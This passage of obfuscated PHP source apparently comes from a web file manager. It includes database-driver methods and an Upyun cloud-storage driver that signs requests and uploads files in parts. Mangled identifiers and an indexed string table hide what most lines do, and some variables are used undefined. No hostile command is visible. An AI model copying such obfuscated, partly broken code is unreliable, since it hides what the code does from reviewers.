explode($¶¤Ñêá›[50], $–èàåÙ); if (count($–èàåÙ) > 1) { $Ñğ¡³êÚ .= $¶¤Ñêá›[51] . $–èàåÙ[1] . $¶¤Ñêá›[52] . $–èàåÙ[0] . $¶¤Ñêá›[53]; } else { $Ñğ¡³êÚ .= $¶¤Ñêá›[51] . $–èàåÙ[0] . $¶¤Ñêá›[53]; } break; case $¶¤Ñêá›[1006]: case $¶¤Ñêá›[1024]: break; case $¶¤Ñêá›[1008]: break; case $¶¤Ñêá›[1007]: case $¶¤Ñêá›[1009]: break; case $¶¤Ñêá›[1036]: default: $Ñğ¡³êÚ .= $¶¤Ñêá›[51] . $–èàåÙ . $¶¤Ñêá›[53]; } } return $Ñğ¡³êÚ; } public function parseKey(&$ÆïˆÖÄÅ, $‚±¦€œ = true) { $ÁŸØ÷§† =& $_SERVER[÷ôÚîå]; if ($‚±¦€œ) { $ÆïˆÖÄÅ = $this->parseKeyCheck($ÆïˆÖÄÅ); } if ($this->dbType == $ÁŸØ÷§†[1036]) { if ($ÆïˆÖÄÅ != $ÁŸØ÷§†[230] && !preg_match($ÁŸØ÷§†[1000], $ÆïˆÖÄÅ)) { $ÆïˆÖÄÅ = $ÁŸØ÷§†[470] . trim($ÆïˆÖÄÅ, $ÁŸØ÷§†[470]) . $ÁŸØ÷§†[470]; } return $ÆïˆÖÄÅ; } else { return parent::parseKey($ÆïˆÖÄÅ, $‚±¦€œ); } } public function close() { $this->_linkID = null; } public function error() { $Ø Ê¿–Õ =& $_SERVER[÷ôÚîå]; if ($this->PDOStatement) { $Ÿ–üıæî = $this->PDOStatement->errorInfo(); $this->error = $Ÿ–üıæî[1] . $Ø Ê¿–Õ[4] . $Ÿ–üıæî[2]; } else { $this->error = $Ø Ê¿–Õ[12]; } if ($Ø Ê¿–Õ[12] != $this->queryStr) { $this->error .= LNG($Ø Ê¿–Õ[48]) . $this->queryStr; } think_trace($this->error, $Ø Ê¿–Õ[12], $Ø Ê¿–Õ[49]); return $this->error; } public function escapeString($‚¼éê¢) { $½Ğí¹™í =& $_SERVER[÷ôÚîå]; switch ($this->dbType) { case $½Ğí¹™í[1033]: case $½Ğí¹™í[1006]: case $½Ğí¹™í[1024]: case $½Ğí¹™í[1036]: return addslashes($‚¼éê¢); case $½Ğí¹™í[1008]: case $½Ğí¹™í[1025]: case $½Ğí¹™í[1007]: case $½Ğí¹™í[1009]: return str_ireplace($½Ğí¹™í[58], $½Ğí¹™í[59], $‚¼éê¢); } } protected function parseValue($´Á¦¦°˜) { $êÓÆã =& $_SERVER[÷ôÚîå]; if (is_string($´Á¦¦°˜)) { $™Ö±Ø•º = strpos($´Á¦¦°˜, $êÓÆã[4]) === 0 && in_array($´Á¦¦°˜, array_keys($this->bind)); $´Á¦¦°˜ = $™Ö±Ø•º ? $this->escapeString($´Á¦¦°˜) : $êÓÆã[1046] . $this->escapeString($´Á¦¦°˜) . $êÓÆã[1046]; } elseif (isset($´Á¦¦°˜[0]) && is_string($´Á¦¦°˜[0]) && strtolower($´Á¦¦°˜[0]) == $êÓÆã[382]) { $´Á¦¦°˜ = $this->escapeString($´Á¦¦°˜[1]); } elseif (is_array($´Á¦¦°˜)) { $´Á¦¦°˜ = array_map(array($this, $êÓÆã[1047]), $´Á¦¦°˜); } elseif (is_bool($´Á¦¦°˜)) { $´Á¦¦°˜ = $´Á¦¦°˜ ? $êÓÆã[101] : $êÓÆã[238]; } elseif (is_null($´Á¦¦°˜)) { $´Á¦¦°˜ = $êÓÆã[116]; } return $´Á¦¦°˜; } public function getLastInsertId() { $¬Äâ‹À¶ =& $_SERVER[÷ôÚîå]; switch ($this->dbType) { case $¬Äâ‹À¶[1033]: case $¬Äâ‹À¶[1025]: case $¬Äâ‹À¶[1006]: case $¬Äâ‹À¶[1024]: case $¬Äâ‹À¶[1008]: case $¬Äâ‹À¶[1036]: return $this->_linkID->lastInsertId(); case $¬Äâ‹À¶[1007]: case $¬Äâ‹À¶[1009]: $¢²²Êã” = $this->table; $Š‘É¹§Ù = $this->query("\123\105\114\x45\x43\124\40{$¢²²Êã”}\56\x63\x75\x72\162\x76\141\154\x20\x63\x75\x72\162\x76\x61\x6c\x20\106\x52\117\115\x20\x64\165\141\154"); return $Š‘É¹§Ù ? $Š‘É¹§Ù[0][$¬Äâ‹À¶[1048]] : 0; } } } goto CÈ×‹¥Ä¢; d‡Ú´ŞÖ†: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ƒÀç“óº, $ñÖæÖÕæ = 0) { parent::__construct(); $this->source = $ƒÀç“óº; $this->sourceSize = $ñÖæÖÕæ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Õç¿ûâà = false) { return $this->sourceSize; } public function getContent($’ãªôõ = false) { return $this->fileSubstr($’ãªôõ, 0, $this->sourceSize); } public function fileSubstr($ÚÎàÍéƒ = false, $²ï¸Ã©Ä = 0, $ñ è„§ş = 0) { if (!$ñ è„§ş) { $ñ è„§ş = $this->sourceSize; } $Î¨æº“Õ = $this->sourceSize - $²ï¸Ã©Ä; if ($ñ è„§ş >= $Î¨æº“Õ) { $ñ è„§ş = $Î¨æº“Õ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $²ï¸Ã©Ä, $ñ è„§ş); } if ($this->sourceType == self::TYPE_FILE) { if ($ñ è„§ş <= 0) { return $_SERVER[÷ôÚîå][12]; } $¼ı¯“Å = ftell($this->source); fseek_64($this->source, $¼ı¯“Å + $²ï¸Ã©Ä); $·»¶»èä = @fread($this->source, $ñ è„§ş); fseek_64($this->source, $¼ı¯“Å); return $·»¶»èä; } } public function hashMd5($¤¢°©¡ú = false) { return md5($this->getContent()); } public static function hash($Ş¯ƒ­Ñ, $Ô†Ñù»Ò = 0) { $­Ìï¹” = new PathDriverStream($Ş¯ƒ­Ñ, $Ô†Ñù»Ò); return $­Ìï¹”->hashSimple($Ş¯ƒ­Ñ); } public static function md5($¨Î©¤ÈŸ, $åıŒÍæ = 0) { $ş¼İ„™À = new PathDriverStream($¨Î©¤ÈŸ, $åıŒÍæ); return $ş¼İ„™À->hashMd5($¨Î©¤ÈŸ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\x2f\x2f\166\x30\x2e\x61\x70\151\56\x75\160\x79\165\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Óó¨¥) { parent::__construct(); $this->_init($Óó¨¥); } public function _init($Ğ“È¥Ğõ) { $¦³«’â‚ =& $_SERVER[÷ôÚîå]; foreach ($Ğ“È¥Ğõ as $è€ã§£¦ => $„Ÿç£Ğ) { if (isset($this->{$è€ã§£¦})) { $this->{$è€ã§£¦} = $„Ÿç£Ğ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¦³«’â‚[1554] . LNG($¦³«’â‚[1473])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($İê™åËª, $ñ£¤ô• = "\x47\x45\124") { $çŠ÷• =& $_SERVER[÷ôÚîå]; $çã‚—‚î = gmdate($çŠ÷•[1502]); $ÄÚÁİŠÖ = base64_encode(hash_hmac($çŠ÷•[1555], "{$ñ£¤ô•}\46{$İê™åËª}\x26{$çã‚—‚î}", md5("{$this->userpass}"), !0)); $¨©˜´ÏĞ = array("\x41\x75\x74\x68\157\x72\151\x7a\x61\x74\151\157\156\x3a\x55\120\x59\x55\116\x20{$this->username}\72{$ÄÚÁİŠÖ}", "\x44\141\164\x65\72{$çã‚—‚î}"); return $¨©˜´ÏĞ; } public function ussRequest($Á×Î¢–, $ç£‹ø‰İ = "\x47\x45\124", $¢áúÌû = false, $áš¶šØ‘ = false, $ó§–±ğÅ = false) { $©‡Î¬ëÆ =& $_SERVER[÷ôÚîå]; $Á×Î¢– = trim($Á×Î¢–, $©‡Î¬ëÆ[8]); $àöæãÈ­ = "\x2f{$this->bucket}\x2f{$Á×Î¢–}"; $Í¹Ì«­ğ = $this->ussHeaders($àöæãÈ­, $ç£‹ø‰İ); if ($áš¶šØ‘) { $Í¹Ì«­ğ = array_merge($Í¹Ì«­ğ, $áš¶šØ‘); } $”ç¡äÃÀ = url_request($this->endpoint . $àöæãÈ­, $ç£‹ø‰İ, $¢áúÌû, $Í¹Ì«­ğ, $ó§–±ğÅ); if (!$”ç¡äÃÀ) { $å Ãò¢ = LNG($©‡Î¬ëÆ[1556]); $this->writeLog($å Ãò¢); return array($©‡Î¬ëÆ[1308] => !1, $©‡Î¬ëÆ[1298] => $å Ãò¢); } if (strtolower($ç£‹ø‰İ) == $©‡Î¬ëÆ[237] || in_array($”ç¡äÃÀ[$©‡Î¬ëÆ[1308]], array($©‡Î¬ëÆ[283], $©‡Î¬ëÆ[1557]))) { $¢áúÌû = $”ç¡äÃÀ[$©‡Î¬ëÆ[1558]]; } else { $¢áúÌû = json_decode($”ç¡äÃÀ[$©‡Î¬ëÆ[1298]], !0); if (!$¢áúÌû) { $¢áúÌû = $”ç¡äÃÀ[$©‡Î¬ëÆ[1298]]; } else { if (!$”ç¡äÃÀ[$©‡Î¬ëÆ[839]] && isset($¢áúÌû[$©‡Î¬ëÆ[1559]])) { $¢áúÌû = $¢áúÌû[$©‡Î¬ëÆ[1559]]; } } } if (!$”ç¡äÃÀ[$©‡Î¬ëÆ[839]]) { $this->writeLog($this->__errorMessage($¢áúÌû)); } return array($©‡Î¬ëÆ[1308] => $”ç¡äÃÀ[$©‡Î¬ëÆ[839]], $©‡Î¬ëÆ[1298] => $¢áúÌû); } private function __errorMessage($ÕÜİ€èê) { $­Èı¡Ğñ =& $_SERVER[÷ôÚîå]; if (!$ÕÜİ€èê) { return $­Èı¡Ğñ[12]; } static $§Ï¯£¥é = null; if (!$§Ï¯£¥é) { $§Ï¯£¥é = I18n::getType(); } if ($§Ï¯£¥é != $­Èı¡Ğñ[1512]) { return $ÕÜİ€èê; } $·šĞ ª¾ = array($­Èı¡Ğñ[1560] => $­Èı¡Ğñ[1561], $­Èı¡Ğñ[1562] => $­Èı¡Ğñ[1563], $­Èı¡Ğñ[1564] => $­Èı¡Ğñ[1563], $­Èı¡Ğñ[1565] => $­Èı¡Ğñ[1566], $­Èı¡Ğñ[1567] => $­Èı¡Ğñ[1568], $­Èı¡Ğñ[1569] => $­Èı¡Ğñ[1570], $­Èı¡Ğñ[1571] => $­Èı¡Ğñ[1572]); return isset($·šĞ ª¾[$ÕÜİ€èê]) ? $·šĞ ª¾[$ÕÜİ€èê] : $ÕÜİ€èê; } public function mkfile($õÚ…şİõ, $‰ÁíÑ¤ = '', $®†õÁö÷ = REPEAT_RENAME) { if ($this->setContent($õÚ…şİõ, $‰ÁíÑ¤)) { return $this->getPathOuter($õÚ…şİõ); } return !1; } public function mkdir($ºı¶¨êû, $İı‘Âú½ = REPEAT_SKIP) { $ÛÁõ›ÛÅ =& $_SERVER[÷ôÚîå]; $Ëë¨£ = trim($ºı¶¨êû, $ÛÁõ›ÛÅ[8]); if ($this->_isFolder($Ëë¨£)) { return $this->getPathOuter($Ëë¨£); } $ë”ğ«…È = array($ÛÁõ›ÛÅ[1573]); $Ò¾ñ²Ÿ = $this->ussRequest($Ëë¨£, $ÛÁõ›ÛÅ[267], !1, $ë”ğ«…È); return $Ò¾ñ²Ÿ[$ÛÁõ›ÛÅ[1308]] ? $this->getPathOuter($Ëë¨£) : !1; } public function copyFile($»ÈåûÅ, $ü †¢®) { $Èòà†Êş =& $_SERVER[÷ôÚîå]; $şŸáı•“ = array($Èòà†Êş[1574] . "\x2f{$this->bucket}\57{$»ÈåûÅ}", $Èòà†Êş[1575]); $³‰Ù˜åÜ = $this->ussRequest($ü †¢®, $Èòà†Êş[269], !1, $şŸáı•“); return $³‰Ù˜åÜ[$Èòà†Êş[1308]] ? !0 : $this->getPathOuter($ü †¢®); } public function moveFile($ÖèŞÑäÆ, $Ö…Ğèª°) { $Ğı¡Ãå³ =& $_SERVER[÷ôÚîå]; $‡Ù‹ÇÇ = array($Ğı¡Ãå³[1576] . "\57{$this->bucket}\x2f{$ÖèŞÑäÆ}", $Ğı¡Ãå³[1575]); $«èç¦› = $this->ussRequest($Ö…Ğèª°, $Ğı¡Ãå³[269], !1, $‡Ù‹ÇÇ); return $«èç¦›[$Ğı¡Ãå³[1308]] ? !0 : $this->getPathOuter($Ö…Ğèª°); } public function delFile($ÒèËğğÉ) { $Á•–ôÃ =& $_SERVER[÷ôÚîå]; $èÔÇÖ… = $this->ussRequest($ÒèËğğÉ, $Á•–ôÃ[1577]); return $èÔÇÖ…[$Á•–ôÃ[1308]] ? !0 : !1; } public function delFolder($ˆ¹µÔø£) { $ü¿¼ó‘• =& $_SERVER[÷ôÚîå]; if (!$this->exist($ˆ¹µÔø£)) { return !0; } $this->listItemCache = !1; $óìÏæ‘Ú = $ğìÒˆÒ = array(); $this->fileList($ˆ¹µÔø£, $óìÏæ‘Ú, $ğìÒˆÒ, !0); $this->listItemCache = !0; foreach ($ğìÒˆÒ as $×ì§ë½ç) { $²³­Î‡ª = $this->ussRequest($×ì§ë½ç[$ü¿¼ó‘•[32]], $ü¿¼ó‘•[1577]); if (!$²³­Î‡ª[$ü¿¼ó‘•[1308]]) { return !1; } } foreach ($óìÏæ‘Ú as $£šºµ„¬) { $²³­Î‡ª = $this->ussRequest($£šºµ„¬, $ü¿¼ó‘•[1577]); if (!$²³­Î‡ª[$ü¿¼ó‘•[1308]]) { return !1; } } $²³­Î‡ª = $this->ussRequest($ˆ¹µÔø£, $ü¿¼ó‘•[1577]); return $²³­Î‡ª[$ü¿¼ó‘•[1308]]; } public function rename($ìí³ı»ò, $üüèœĞı) { if ($this->isFile($ìí³ı»ò)) { $üüèœĞı = get_path_father($ìí³ı»ò) . $üüèœĞı; return $this->moveFile($ìí³ı»ò, $üüèœĞı); } return $this->renameObject($ìí³ı»ò, $üüèœĞı); } public function fileInfo($õö½Îôô, $ªñµñğ = false, $¤ôøÒ•‡ = array()) { $ğØ™ôÈª =& $_SERVER[÷ôÚîå]; $¼›·ÙÙí = array($ğØ™ôÈª[32] => $this->pathThis($õö½Îôô), $ğØ™ôÈª[97] => $this->getPathOuter($ğØ™ôÈª[8] . $õö½Îôô), $ğØ™ôÈª[33] => $ğØ™ôÈª[240], $ğØ™ôÈª[89] => isset($¤ôøÒ•‡[$ğØ™ôÈª[89]]) ? $¤ôøÒ•‡[$ğØ™ôÈª[89]] : 0, $ğØ™ôÈª[179] => $this->ext($õö½Îôô)); if ($ªñµñğ) { return $¼›·ÙÙí; } $¼›·ÙÙí[$ğØ™ôÈª[241]] = $¼›·ÙÙí[$ğØ™ôÈª[98]] = 0; $¼›·ÙÙí[$ğØ™ôÈª[242]] = $¼›·ÙÙí[$ğØ™ôÈª[243]] = !0; if (empty($¤ôøÒ•‡)) { $¤ôøÒ•‡ = $this->objectMeta($õö½Îôô); if (!$¤ôøÒ•‡) { return $¼›·ÙÙí; } } $¼›·ÙÙí[$ğØ™ôÈª[241]] = intval($¤ôøÒ•‡[$ğØ™ôÈª[1578]]); $¼›·ÙÙí[$ğØ™ôÈª[98]] = intval($¤ôøÒ•‡[$ğØ™ôÈª[1579]]); $¼›·ÙÙí[$ğØ™ôÈª[89]] = $¤ôøÒ•‡[$ğØ™ôÈª[89]]; return $¼›·ÙÙí; } public function folderInfo($ô®Ÿ¿£, $ŠêßáúÂ = false) { $Òîï€¶° =& $_SERVER[÷ôÚîå]; $¿İÚƒ” = array($Òîï€¶°[32] => $this->pathThis($ô®Ÿ¿£), $Òîï€¶°[97] => $this->getPathOuter($Òîï€¶°[8] . $ô®Ÿ¿£), $Òîï€¶°[33] => $Òîï€¶°[88]); if ($ŠêßáúÂ) { return $¿İÚƒ”; } $¿İÚƒ”[$Òîï€¶°[241]] = $¿İÚƒ”[$Òîï€¶°[98]] = 0; $¿İÚƒ”[$Òîï€¶°[242]] = $¿İÚƒ”[$Òîï€¶°[243]] = !0; if (empty($ñ€¬ëÎ)) { $ñ€¬ëÎ = $this->objectMeta($ô®Ÿ¿£); if (!$ñ€¬ëÎ) { return $¿İÚƒ”; } } $¿İÚƒ”[$Òîï€¶°[241]] = intval($ñ€¬ëÎ[$Òîï€¶°[1578]]); $¿İÚƒ”[$Òîï€¶°[98]] = intval($ñ€¬ëÎ[$Òîï€¶°[1579]]); return $¿İÚƒ”; } private function listObjs($÷è¦Ğ®Ô, $ğµ»ø˜× = 0, $àò€“ÁÂ = 1000) { $‚úÌæ€Å =& $_SERVER[÷ôÚîå]; $Ì’ÆÊ = array($‚úÌæ€Å[1580], $‚úÌæ€Å[1581] . $àò€“ÁÂ); if ($ğµ»ø˜×) { $Ì’ÆÊ[] = $‚úÌæ€Å[1582] . $ğµ»ø˜×; } $áùŒ¸®² = $this->ussRequest($÷è¦Ğ®Ô, $‚úÌæ€Å[271], !1, $Ì’ÆÊ); return !$áùŒ¸®²[$‚úÌæ€Å[1308]] ? !1 : $áùŒ¸®²[$‚úÌæ€Å[1298]]; } private function fileList($üôßÂ¢†, &$É¸¨õã‘, &$›äÚòÈ, $ñ‡Ã¢œ’ = false) { $´‘³ï‰ =& $_SERVER[÷ôÚîå]; $¢îúÛßö = $´‘³ï‰[12]; $ôá¸Ìàé = 1000; $¿…¿Ï¹Ø = rtrim($üôßÂ¢†, $´‘³ï‰[8]) . $´‘³ï‰[8]; while (!0) { check_abort(); $à¢æüœ = $this->listObjs($üôßÂ¢†, $¢îúÛßö, $ôá¸Ìàé); if (!$à¢æüœ) { return !1; } $¢îúÛßö = isset($à¢æüœ[$´‘³ï‰[1583]]) ? $à¢æüœ[$´‘³ï‰[1583]] : $´‘³ï‰[12]; $á±åÓ§« = isset($à¢æüœ[$´‘³ï‰[1584]]) ? $à¢æüœ[$´‘³ï‰[1584]] : array(); foreach ($á±åÓ§« as $©áäË‰) { $¯Ü“Îô¤ = $©áäË‰[$´‘³ï‰[33]] == $´‘³ï‰[88] ? !0 : !1; $Óôà­¤ô = ltrim($¿…¿Ï¹Ø . $©áäË‰[$´‘³ï‰[32]], $´‘³ï‰[8]) . ($¯Ü“Îô¤ ? $´‘³ï‰[8] : $´‘³ï‰[12]); $§¹Ú¿•ê = array($´‘³ï‰[32] => $Óôà­¤ô, $´‘³ï‰[33] => $¯Ü“Îô¤ ? $´‘³ï‰[88] : $´‘³ï‰[240], $´‘³ï‰[89] => $©áäË‰[$´‘³ï‰[422]], $´‘³ï‰[1579] => $©áäË‰[$´‘³ï‰[1585]]); $this->cacheMethodInfoSet($Óôà­¤ô, $¯Ü“Îô¤, $§¹Ú¿•ê); if ($¯Ü“Îô¤) { $É¸¨õã‘[] = $Óôà­¤ô; if ($ñ‡Ã¢œ’) { $this->fileList($Óôà­¤ô, $É¸¨õã‘, $›äÚòÈ, $ñ‡Ã¢œ’); } continue; } $›äÚòÈ[] = $§¹Ú¿•ê; } if (count($á±åÓ§«) < $ôá¸Ìàé) { break; } } $this->cacheMethodInfoSet($üôßÂ¢†, !0); } public function listPath($“îÙ´ïÖ, $™ó‚‡»› = false) { $Ê‘ÓÙş‚ =& $_SERVER[÷ôÚîå]; $Ğ¯ã‰Â¤ = $€ÁÙÛÌ” = array(); $this->fileList($“îÙ´ïÖ, $Ğ¯ã‰Â¤, $€ÁÙÛÌ”); foreach ($Ğ¯ã‰Â¤ as $–‘Å¤ù => $»©·Á«) { $Ğ¯ã‰Â¤[$–‘Å¤ù] = $this->folderInfo($»©·Á«, $™ó‚‡»›); } foreach ($€ÁÙÛÌ” as $–‘Å¤ù => $»©·Á«) { $€ÁÙÛÌ”[$–‘Å¤ù] = $this->fileInfo($»©·Á«[$Ê‘ÓÙş‚[32]], $™ó‚‡»›, $»©·Á«); } return array($Ê‘ÓÙş‚[95] => $Ğ¯ã‰Â¤, $Ê‘ÓÙş‚[96] => $€ÁÙÛÌ”); } public function has($ùˆËƒóî, $½…²ÂÈ = false, $ûÛ›şÓ™ = true) { $üÒ§ì€Í =& $_SERVER[÷ôÚîå]; $ŞÀ¬ûï× = $üÒ§ì€Í[12]; $ÖÅªòöÌ = 500; $‰«×ÚëÙ = 0; $†Ü´½éÔ = 0; $ª¼½å›ß = rtrim($ùˆËƒóî, $üÒ§ì€Í[8]) . $üÒ§ì€Í[8]; while (!0) { check_abort(); $‰Ûà©ãµ = $this->listObjs($ùˆËƒóî, $ŞÀ¬ûï×, $ÖÅªòöÌ); if (!$‰Ûà©ãµ) { return !1; } $ŞÀ¬ûï× = isset($‰Ûà©ãµ[$üÒ§ì€Í[1583]]) ? $‰Ûà©ãµ[$üÒ§ì€Í[1583]] : $üÒ§ì€Í[12]; $·ÅÉ‘Î = isset($‰Ûà©ãµ[$üÒ§ì€Í[1584]]) ? $‰Ûà©ãµ[$üÒ§ì€Í[1584]] : array(); if (empty($·ÅÉ‘Î)) { break; } $ Á—«‘ = array_filter($·ÅÉ‘Î, function ($³«‘Ùö¥) { $Ñ£ÌÜƒç =& $_SERVER[÷ôÚîå]; return $³«‘Ùö¥[$Ñ£ÌÜƒç[33]] == $Ñ£ÌÜƒç[88]; }); $ãÖúÄèï = count($·ÅÉ‘Î); $ Á—«‘ = count($ Á—«‘); $î†‰Ç¤Ş = $ãÖúÄèï - $ Á—«‘; if ($½…²ÂÈ) { $†Ü´½éÔ += $ Á—«‘; $‰«×ÚëÙ += $î†‰Ç¤Ş; if ($ãÖúÄèï < $ÖÅªòöÌ) { break; } continue; } if ($ûÛ›şÓ™) { if ($î†‰Ç¤Ş) { return !0; } } else { if ($ Á—«‘) { return !0; } } if ($ãÖúÄèï < $ÖÅªòöÌ) { break; } } if ($½…²ÂÈ) { return array($üÒ§ì€Í[249] => $‰«×ÚëÙ, $üÒ§ì€Í[250] => $†Ü´½éÔ); } return !1; } public function listAll($‰½Í°¯) { $ÌÍÆ×È° =& $_SERVER[÷ôÚîå]; $ğÈÌ” = $İğ…Äùœ = array(); $this->fileList($‰½Í°¯, $ğÈÌ”, $İğ…Äùœ, !0); $›íÏí©× = array_to_keyvalue($İğ…Äùœ, $ÌÍÆ×È°[32]); foreach ($ğÈÌ” as $ğÔª˜Œ·) { if (is_string($ğÔª˜Œ·)) { $›íÏí©×[$ğÔª˜Œ·] = array($ÌÍÆ×È°[89] => 0); } } return $this->listAllFiles($‰½Í°¯, $›íÏí©×); } public function canRead($è¢ˆÙ“½) { return $this->exist($è¢ˆÙ“½) ? !0 : !1; } public function canWrite($Ó€•ı) { return $this->exist($Ó€•ı) ? !0 : !1; } public function getContent($¶×¨—ÆŸ) { return $this->fileSubstr($¶×¨—ÆŸ, 0, -1); } public function setContent($ãĞö„Œ¦, $Ê¨œôÍ = '') { $Ò¢ì§Šú =& $_SERVER[÷ôÚîå]; if (!$Ê¨œôÍ) { $‚”šµÊ‘ = $this->ussRequest($ãĞö„Œ¦, $Ò¢ì§Šú[267]); return $‚”šµÊ‘[$Ò¢ì§Šú[1308]]; } $œ‹ÕÀŒ£ = $this->tempFile($this->pathThis($ãĞö„Œ¦)); file_put_contents($œ‹ÕÀŒ£, $Ê¨œôÍ); if ($this->upload($ãĞö„Œ¦, $œ‹ÕÀŒ£)) { $this->tempFileRemve($œ‹ÕÀŒ£); return !0; } return !1; } public function fileSubstr($æÜÑ³ÎÄ, $Àêç‹¿Ç, $¦†âÏùé) { $ú¹“˜ìê =& $_SERVER[÷ôÚîå]; if (!($©Ğî¸‘± = $this->link($æÜÑ³ÎÄ))) { return !1; } $¶ü„ë = !1; if ($¦†âÏùé > 0) { $Øü®à¾Ø = $Àêç‹¿Ç + $¦†âÏùé - 1; $¶ü„ë = array($ú¹“˜ìê[1544] . $Àêç‹¿Ç . $ú¹“˜ìê[471] . $Øü®à¾Ø); } $¶ğÍöÑÄ = url_request($©Ğî¸‘±, $ú¹“˜ìê[271], !1, $¶ü„ë); return $¶ğÍöÑÄ[$ú¹“˜ìê[839]] ? $¶ğÍöÑÄ[$ú¹“˜ìê[1298]] : !1; } public function upload($›ìÜÖ¢, $¥±×ü³Ñ, $ªğÒ²š² = false, $›Æ’ÕÑî = REPEAT_REPLACE) { $÷ƒš™½¢ =& $_SERVER[÷ôÚîå]; $‡ïÜ„æ = IO::size($¥±×ü³Ñ); if ($‡ïÜ„æ <= 1024 * 1024 * 200) { $£Êòşö = array($÷ƒš™½¢[1586] . $¥±×ü³Ñ); $Ç¸Â§Œ = $this->ussRequest($›ìÜÖ¢, $÷ƒš™½¢[269], $£Êòşö); return $Ç¸Â§Œ[$÷ƒš™½¢[1308]] ? $this->getPathOuter($›ìÜÖ¢) : !1; } $‘ì­×èÔ = 1024 * 1024 * 10; $ÅœÊ¢Ò‡ = array($÷ƒš™½¢[1587], $÷ƒš™½¢[1588] . $‡ïÜ„æ, $÷ƒš™½¢[1589], $÷ƒš™½¢[1590] . $‘ì­×èÔ); $Ç¸Â§Œ = $this->ussRequest($›ìÜÖ¢, $÷ƒš™½¢[269], !1, $ÅœÊ¢Ò‡); if (!$Ç¸Â§Œ[$÷ƒš™½¢[1308]]) { return !1; } $¥³ÌæÑ¸ = $Ç¸Â§Œ[$÷ƒš™½¢[1298]]; $§Ÿ–ÃÆ” = 0; $ÀµÀİ–ò = $¥³ÌæÑ¸[$÷ƒš™½¢[1591]]; $ü†ÅŠ¿œ = fopen($¥±×ü³Ñ, $÷ƒš™½¢[1467]); if (!$ü†ÅŠ¿œ) { return !1; } do { $Š¸ã¥» = $¥³ÌæÑ¸[$÷ƒš™½¢[1592]]; fseek_64($ü†ÅŠ¿œ, $§Ÿ–ÃÆ”); $Ü´¬‹£ñ = fread($ü†ÅŠ¿œ, $Š¸ã¥»); $šé‰Ğ•» = 0; do { $šé‰Ğ•»++; $¥³ÌæÑ¸ = $this->uploadPart($›ìÜÖ¢, $¥³ÌæÑ¸, $Ü´¬‹£ñ); } while (!$¥³ÌæÑ¸ && $šé‰Ğ•» < 3); if (!$¥³ÌæÑ¸) { return !1; } $ÀµÀİ–ò = $¥³ÌæÑ¸[$÷ƒš™½¢[1591]]; $§Ÿ–ÃÆ” += $Š¸ã¥»; } while ($ÀµÀİ–ò != -1); fclose($ü†ÅŠ¿œ); $ÅœÊ¢Ò‡ = array($÷ƒš™½¢[1593], $÷ƒš™½¢[1594] . $¥³ÌæÑ¸[$÷ƒš™½¢[1595]], $÷ƒš™½¢[1589]); $Ç¸Â§Œ = $this->ussRequest($›ìÜÖ¢, $÷ƒš™½¢[269], !1, $ÅœÊ¢Ò‡); return $Ç¸Â§Œ[$÷ƒš™½¢[1308]] ? $this->getPathOuter($Á÷Áùª‘) : !1; } private function uploadPart($”‚•ù”£, $ÈÌÅ–ã, &$ˆÈÂÃ¢Ä) { $äÚİ§± =& $_SERVER[÷ôÚîå]; $¼€åÀ = array($äÚİ§±[1596], $äÚİ§±[1594] . $ÈÌÅ–ã[$äÚİ§±[1595]], $äÚİ§±[1597] . $ÈÌÅ–ã[$äÚİ§±[1591]], $äÚİ§±[156] . $ÈÌÅ–ã[$äÚİ§±[1592]]); $Õ‚Îöˆ = $this->ussRequest($”‚•ù”£, $äÚİ§±[269], $ˆÈÂÃ¢Ä, $¼€åÀ); return !$Õ‚Îöˆ[$äÚİ§±[1308]] ? $Õ‚Îöˆ[$äÚİ§±[1308]] : $Õ‚Îöˆ[$äÚİ§±[1298]]; } public function uploadFormData($»˜š—˜, $ñ¸ëÁù = 3600) { return $this->uploadPolicy($»˜š—˜, $ñ¸ëÁù); } public function multiUploadFormData($†ÕŸò•ù, $¶ƒ¿üµ = 3600) { $Úˆğñµö =& $_SERVER[÷ôÚîå]; $éİ¨¢ğá = (int) $GLOBALS[$Úˆğñµö[7]][$Úˆğñµö[89]]; return $this->uploadPolicy($†ÕŸò•ù, $¶ƒ¿üµ, $éİ¨¢ğá); } private function uploadPolicy($¸êôÛËì, $è½áÑµ– = 3600, $°™÷øµ  = 0) { $£¥õôŒÛ =& $_SERVER[÷ôÚîå]; $ÍÚ”ÆáÉ = $£¥õôŒÛ[8] . $this->bucket; $¯º˜ÃÀ = gmdate($£¥õôŒÛ[1502]); $œ•‚éÆ¼ = array($£¥õôŒÛ[1598] => $this->bucket, $£¥õôŒÛ[1599] => $¸êôÛËì, $£¥õôŒÛ[1600] => time() + $è½áÑµ–, $£¥õôŒÛ[1601] => $¯º˜ÃÀ); if ($°™÷øµ ) { $œ•‚éÆ¼[$£¥õôŒÛ[1487]] = $°™÷øµ ; } $‰›Æ®û = base64_encode(json_encode($œ•‚éÆ¼)); $ë®²ÌÂï = base64_encode(hash_hmac($£¥õôŒÛ[1555], "\x50\x4f\x53\x54\x26{$ÍÚ”ÆáÉ}\46{$¯º˜ÃÀ}\x26{$‰›Æ®û}", md5("{$this->userpass}"), !0)); $Ì¯È¡š™ = array($£¥õôŒÛ[302] => $‰›Æ®û, $£¥õôŒÛ[1602] => "\x55\120\x59\x55\x4e\x20{$this->username}\x3a{$ë®²ÌÂï}", $£¥õôŒÛ[218] => $this->endpoint . $ÍÚ”ÆáÉ); return $Ì¯È¡š™; } public function download($ÄŸ«öÒ», $Üƒ è—) { $îåĞ»ê¶ = IO::getPathInner(IO::mkfile($Üƒ è—)); if (!($¾í™Œ‹® = $this->link($ÄŸ«öÒ»))) { return !1; } $œ–½Î±ú = 0; $ó‡¸Ë»® = 1024 * 200; $ö î®—Ñ = fopen($îåĞ»ê¶, $_SERVER[÷ôÚîå][1550]); while (!0) { $ê“ÏÑŠ¦ = $this->fileSubstr($ÄŸ«öÒ», $œ–½Î±ú, 